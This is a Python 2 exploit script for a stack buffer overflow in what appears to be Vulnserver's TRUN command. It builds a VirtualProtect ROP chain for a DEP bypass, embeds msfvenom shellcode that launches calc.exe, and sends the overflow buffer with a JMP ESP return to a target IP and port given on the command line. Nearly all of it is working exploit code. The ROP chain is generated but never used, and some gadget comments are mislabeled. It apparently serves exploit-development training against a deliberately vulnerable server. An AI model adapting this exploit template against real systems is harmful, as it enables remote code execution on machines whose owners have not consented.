#!/usr/bin/env python2


import socket
import sys
import logging
import struct


# ROP Chain
# in this case we want to call Virtual Protect with some arguments  
# The idea is to put address of Virtualprotect into EAX,
# EBX,ECX,EDX,ESP the argument for Virtualprotect
# we have to put in registers some value that can be used
# then pushad (all value)
# Then return
# EAX = some NOPs
# ECX = lpOldProtect (some writable address)
# EDX = NewProtect (0x40)
# EBX = dwSize (0x201)
# ESP = lPAddress (automically compiled: location of the shellcode, more or less), 
# EBP = POP RET
# ESI = ptr to virtual protect
# EDI = RET 
# EBP = pointer to jmp esp
# pushad 

# At the end of the rop the stack will be as well
# the rop will put the register on the stack with pushad
# The stack will contain:
# EDI = RET
# ESI = virtual protect address
# EBP = POP Ret
# ESP = first argument to virtualprotect (poiting to the shellcode address)
# EDX = second argument
# ECX = third argumentt 
# EBX = fourth argument
# EAX = (NOps)
# shellcode

# virtualprotect will be called and change the permission to shellcode area
# return from virtual protect will jump to POP Ret (from EBP)
# the ret will go return to shellcode



def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [

      # EDX <- NewProtect (0x40)
      0x625011f0,   # POP EAX # RETN
      0xffffffc0,   # VAlue for EDX (- 0x40)
      0x77d43163,   # NEG EAX, RET
      0x77c393fa,   # XCHG EAX,EDX # RETN

      # EBX <- dwSize (0x201)
      0x625011f0,   # POP EAX # RETN
      0xfffffdff,   # VAlue for EDX (- 0x40)
      0x77d43163,   # NEG EAX, RET
      0x77c39406,   # XCHG EAX,EBX

      # EcX <- lpOldProtect
      0x77c2682b,   # POP ECX # RETN    ** [RPCRT4.dll]
      0x62504eaf,   # &Writable location 

      # EDI <- RETN address (to help in executing the ROP chain after pushad
      0x41adf1ca,  # POP EDI # RETN [WS2_32.DLL] ** ASLR 
      0x77d43165,  # RETN (ROP NOP) [user32.dll] ** ASLR

      # ESI <- pointer to VirtualProtect
      0x77e87b82,  # POP EAX # RETN [kernel32.dll] ** ASLR 
      0x6250609c,  # ptr to &VirtualProtect() [IAT essfunc.dll]
      0x70994412,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [MSCTF.dll] ** ASLR 
      0x77c2ae76,  # XCHG EAX,ESI # RETN [RPCRT4.dll] ** ASLR 

      # EAX <- some NOP (they will be just before the shellcode)
      0x625011f0,   # POP EAX # RETN
      0x90909090,  # ptr to &VirtualProtect() [IAT essfunc.dll]

      # EBP <- jmp esp address
      0x625011e6,  # POP EBP # RETN [essfunc.dll] 
      0x625011c7,  # & jmp esp [essfunc.dll]

      # final PUSHAD
      0x77bec0fd,  # PUSHAD # RETN [RPCRT4.dll] ** ASLR 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)



# msfvenom -p windows/exec cmd=calc.exe -b "\x00\x0a\x0d" -f python -v shellcode
shellcode =  b""
shellcode += b"\xbb\x74\xb9\x7d\xcb\xda\xc2\xd9\x74\x24\xf4"
shellcode += b"\x5a\x29\xc9\xb1\x31\x31\x5a\x13\x83\xea\xfc"
shellcode += b"\x03\x5a\x7b\x5b\x88\x37\x6b\x19\x73\xc8\x6b"
shellcode += b"\x7e\xfd\x2d\x5a\xbe\x99\x26\xcc\x0e\xe9\x6b"
shellcode += b"\xe0\xe5\xbf\x9f\x73\x8b\x17\xaf\x34\x26\x4e"
shellcode += b"\x9e\xc5\x1b\xb2\x81\x45\x66\xe7\x61\x74\xa9"
shellcode += b"\xfa\x60\xb1\xd4\xf7\x31\x6a\x92\xaa\xa5\x1f"
shellcode += b"\xee\x76\x4d\x53\xfe\xfe\xb2\x23\x01\x2e\x65"
shellcode += b"\x38\x58\xf0\x87\xed\xd0\xb9\x9f\xf2\xdd\x70"
shellcode += b"\x2b\xc0\xaa\x82\xfd\x19\x52\x28\xc0\x96\xa1"
shellcode += b"\x30\x04\x10\x5a\x47\x7c\x63\xe7\x50\xbb\x1e"
shellcode += b"\x33\xd4\x58\xb8\xb0\x4e\x85\x39\x14\x08\x4e"
shellcode += b"\x35\xd1\x5e\x08\x59\xe4\xb3\x22\x65\x6d\x32"
shellcode += b"\xe5\xec\x35\x11\x21\xb5\xee\x38\x70\x13\x40"
shellcode += b"\x44\x62\xfc\x3d\xe0\xe8\x10\x29\x99\xb2\x7e"
shellcode += b"\xac\x2f\xc9\xcc\xae\x2f\xd2\x60\xc7\x1e\x59"
shellcode += b"\xef\x90\x9e\x88\x54\x6e\xd5\x91\xfc\xe7\xb0"
shellcode += b"\x43\xbd\x65\x43\xbe\x81\x93\xc0\x4b\x79\x60"
shellcode += b"\xd8\x39\x7c\x2c\x5e\xd1\x0c\x3d\x0b\xd5\xa3"
shellcode += b"\x3e\x1e\xb6\x22\xad\xc2\x17\xc1\x55\x60\x68"


# Super classic JMP ESP + Shellcode
offset=2003

rop_chain = create_rop_chain()

ret = struct.pack('<I', 0x62501057)


buf  = "TRUN /.:/"
buf += "\x90"*offset
buf += ret
buf += shellcode
buf += '\r\n'

if len(sys.argv) != 3:
    logging.error("usage: " + sys.argv[0] + " ip port")
    sys.exit(-1)

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.connect((sys.argv[1], int(sys.argv[2])))
except socket.error as msg:
    logging.error("couldn't connect with target (%s)" % msg)
    sys.exit(1)

# Receives the hello message
rec_data= s.recv(1024)
print rec_data

# Send egg shellcode
s.send(buf)

rec_data= s.recv(1024)
print rec_data

